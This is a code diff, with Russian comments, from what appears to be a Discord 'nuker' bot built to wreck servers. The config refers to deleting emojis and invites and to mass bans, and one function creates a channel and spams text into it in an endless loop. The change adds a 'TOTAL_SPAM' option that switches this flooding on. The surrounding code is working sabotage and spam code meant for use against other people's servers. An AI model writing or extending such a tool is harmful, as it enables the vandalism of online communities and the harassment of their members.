@@ -53,7 +53,10 @@ config_example = '''
         'DELETE_EMOJIS': True,
 
         # Удалять ли приглашения?
-        'DELETE_INVITES': True
+        'DELETE_INVITES': True,
+
+        # Спамить ли на всех каналах?
+        'TOTAL_SPAM': True
     },
 
     # Участники, которых не нужно банить.
@@ -250,8 +253,10 @@ async def NEW_CHANNEL(ctx):
     try:
         channel = await ctx.guild.create_text_channel(data['CHANNELS_NAME'])
         print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создан канал')
-        while True:
-            await channel.send(data['SPAM_TEXT'])
+
+        if data['NUKER_OPTIONS']['TOTAL_SPAM']:
+            while True:
+                await channel.send(data['SPAM_TEXT'])
     except:
         pass
 
